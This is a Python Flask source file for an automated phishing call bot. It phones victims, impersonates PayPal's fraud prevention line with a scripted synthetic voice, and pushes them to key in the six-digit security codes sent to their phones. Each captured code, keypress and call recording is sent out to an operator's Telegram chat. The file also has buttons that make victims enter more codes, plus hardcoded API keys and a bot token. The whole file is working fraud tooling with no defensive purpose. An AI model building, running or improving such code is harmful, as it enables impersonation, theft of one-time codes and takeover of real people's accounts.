from flask import Flask, jsonify, request
import requests
import json
import urllib.parse



app = Flask(__name__)
jokerapikey = "mA91SG0XdS6ZUX2SEivdhD107AopdAfZ"
token = "6409753184:AAGdJ3GBWBM2TkeFaJ-8nLB4qsjQakVy4AQ"
@app.route("/callback", methods=["POST"])
def callbacks():


    # Process the incoming data
    data = request.json  # or request.data, depending on the content you expect
    print("Received callback data:", data)
    
    # Perform your processing here
    # ...

    # Return a valid response
    return jsonify({"message": "Callback received successfully"}), 200


@app.route("/makecall/<chat_id>/<name>", methods=["POST"])
def call(chat_id,name):
    data = request.get_json(force=True)
    callsid = data['callsid']
    if 'callsid' in data and 'status' in data:
        status = {data['callsid']: data['status']}
        print(data)
    else:
        return "Invalid data.", 400
    if data['event_name'] == "call.ringing":
            cca = str(callsid +"$"+ chat_id)
            callback_accept = json.dumps({"action": "endcall", "sid": cca})

            keyboard = [
                [

                    {"text": "End Call", "callback_data": callback_accept},
                ],
            ]

            params = {
                "chat_id": chat_id,
                "text": "├ Rining",
                "reply_markup": json.dumps({"inline_keyboard": keyboard}),
            }

            response = requests.post(f"https://api.telegram.org/bot{token}/sendMessage", data=params)

            print(response.json()) 

            return "Any Response."
    elif data['status'] == "call.answered":
        print(callsid+"")
        base_url = "https://api.jokerapi.co/voice/v1/gathertext"
        apikey = "mA91SG0XdS6ZUX2SEivdhD107AopdAfZ"
        callsid1 = callsid
        text = f"Hello {name}, this is an automated call from the Paypal fraud prevention line. We have sent this automated call because of an attempt to change the phone number linked to your Paypal account. If this was not you, please press 1. If this was you, you may hangup now."
        voice = "ai3-Jenny"

        url = f"{base_url}?apikey={apikey}&callsid={callsid1}&text={text}&voice={voice}&maxdigits=1"

        response = requests.get(url)
        cca = str(callsid1 +"$"+ chat_id)
        callback_accept = json.dumps({"action": 1, "sid": cca })
        callback_decline = json.dumps({"action": 2, "sid": cca})
        callback_more = json.dumps({"action": 3, "sid": cca})
        print (callback_accept)
        keyboard = [
            [

                {"text": "accept", "callback_data": callback_accept},
                {"text": "more", "callback_data": callback_more},
                {"text": "reject", "callback_data": callback_decline},
            ],
        ]

        params = {
            "chat_id": chat_id,
            "text": f"├ ✅ OTP Code:  Choose an option:",
            "reply_markup": json.dumps({"inline_keyboard": keyboard}),
        }

        

        r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text=├ 🤳 Call has been answered.") and requests.post(f"https://api.telegram.org/bot{token}/sendMessage", data=params)
        print("Response:", response.json())
        return "Any Response."
    elif data['status'] == "human.detected":
            r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text=├  Human Detected")
            return "Any Response."
    elif data['status'] == "machine.detected":
            r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text=├ 🔔 Voicemail Detected")
            return "Any Response."
    elif data['status'] == "call.ended":
        if 'recordingurl' in data:
            response = requests.get(data['recordingurl'])
            payload = {
                'chat_id': chat_id,
                'title': 'transcript.wav',
                'parse_mode': 'HTML'
            }
            files = {
                'audio': response.content,
            }
            requests.post(f"https://api.telegram.org/bot{token}/sendAudio".format(token=f"{token}"),
                data=payload,
                files=files) and requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text=├ 📞 Call has been hangup.")
            return "Any Response."
        r = requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text=├ 📵 Call has been hangup.")
        return "Any Response."
    elif data['status'] == "dtmf.entered":
        codeis = data['digit']
        r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text=├ 📞 DTMF Entered {codeis} ")
        return "Any Response."
        
    elif 'digits' in data:
        if data['digits'] == "1":
            print(data["digits"])
            base_url = "https://api.jokerapi.co/voice/v1/gathertext"
            apikey = "mA91SG0XdS6ZUX2SEivdhD107AopdAfZ"
            callsid1 = callsid
            text = "To block this request, please enter the 6 digit security code that we have sent to your mobile device"
            voice = "ai3-Jenny"
            url = f"{base_url}?apikey={apikey}&callsid={callsid1}&text={text}&voice={voice}&maxdigits=6"
            response = requests.get(url)
            r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text=├ 📲 Send OTP..")

            print("Response:", response.json())
        elif len(data['digits']) < 6 and len(data['digits']) > 1:
            otpcode22 = data["digits"]
            r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text=├ 📲 otp is : {otpcode22}")

        elif len(data['digits']) == 6:
            otp2 = data["digits"]
            print(data["digits"])
            base_url = "https://api.jokerapi.co/voice/v1/playtext"
            apikey = "mA91SG0XdS6ZUX2SEivdhD107AopdAfZ"
            callsid1 = callsid
            text = "Please wait until we check the code"
            voice = "ai3-Jenny"
            url = f"{base_url}?apikey={apikey}&callsid={callsid1}&text={text}&voice={voice}"
            response = requests.get(url)
            chat_id1 = str(chat_id)
            cca = str(callsid1 +"$"+ chat_id1)
            callback_accept = json.dumps({"action": 1, "sid": cca })
            callback_decline = json.dumps({"action": 2, "sid": cca})
            callback_more = json.dumps({"action": 3, "sid": cca})
            print (callback_accept)
            keyboard = [
                [

                    {"text": "accept", "callback_data": callback_accept},
                    {"text": "more", "callback_data": callback_more},
                    {"text": "reject", "callback_data": callback_decline},
                ],
            ]

            params = {
                "chat_id": chat_id,
                "text": f"├ ✅ OTP Code: {otp2} Choose an option:",
                "reply_markup": json.dumps({"inline_keyboard": keyboard}),
            }

            response = requests.post(f"https://api.telegram.org/bot{token}/sendMessage", data=params)

            print(response.json())            
        return "Any Response."

            
    else:
        return "Unhandled status.", 400
@app.route('/otp', methods=['POST'])
def handle_update():
    data = request.get_json()
    print(data)
    callsid, chat_id1 = data['sid'].split('$')
    action = data.get('action')  # Get the value of 'action' key, or None if it doesn't exist

    print(chat_id1)
    if action == 1 :
            base_url = "https://api.jokerapi.co/voice/v1/playtext"
            apikey = "mA91SG0XdS6ZUX2SEivdhD107AopdAfZ"
            callsid1 = callsid
            text = "Thank you, the code is valid"
            voice = "ai3-Jenny"
            url = f"{base_url}?apikey={apikey}&callsid={callsid1}&text={text}&voice={voice}"
            response = requests.get(url) 
            r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id1}&text=├ code accepted")
    elif action == 'endcall' :
            base_url = "https://api.jokerapi.co/voice/v1/hangup"
            apikey = "mA91SG0XdS6ZUX2SEivdhD107AopdAfZ"
            callsid1 = callsid
            url = f"{base_url}?apikey={apikey}&callsid={callsid1}"
            response = requests.get(url)
    elif action == 2 :  
        base_url = "https://api.jokerapi.co/voice/v1/gathertext"
        apikey = "mA91SG0XdS6ZUX2SEivdhD107AopdAfZ"
        callsid1 = callsid
        text = f"the code you entered is not valid , please enter the code again"
        voice = "ai3-Jenny"

        url = f"https://api.jokerapi.co/voice/v1/gathertext?apikey={apikey}&callsid={callsid1}&text={text}&voice={voice}&maxdigits=6"

        response = requests.get(url)
        r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id1}&text=├ code rejected")
    elif action == 3 :  
        base_url = "https://api.jokerapi.co/voice/v1/gathertext"
        apikey = "mA91SG0XdS6ZUX2SEivdhD107AopdAfZ"
        callsid1 = callsid
        text = f"Thank you , but for more security we have sent you one more code , please enter it"
        voice = "ai3-Jenny"

        url = f"https://api.jokerapi.co/voice/v1/gathertext?apikey={apikey}&callsid={callsid1}&text={text}&voice={voice}&maxdigits=6"

        response = requests.get(url)
        r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id1}&text=├ asked for more code")

    return 'ok'
@app.route('/decline/<sid>', methods=['POST'])
def decline(sid):
# Define the base URL and parameters
    base_url = "https://api.jokerapi.co/voice/v1/gathertext"
    api_key = "mA91SG0XdS6ZUX2SEivdhD107AopdAfZ"
    callsid1 = sid
    text = "The code you entered isn't valid , please enter the code again"
    voice = "ai3-Jenny"
    max_digits = 6

    # URL encode the parameters
    encoded_text = urllib.parse.quote(text)

    # Construct the URL using f-string with encoded parameters
    url = f"{base_url}?apikey={api_key}&callsid={callsid1}&text={encoded_text}&voice={voice}&maxdigits={max_digits}"
    response = requests.post(url) 
    # Print the final URL
    print("Response:", response.json() )
    return 'ok'


if __name__ == "__main__":    
    app.run("0.0.0.0", port=8080)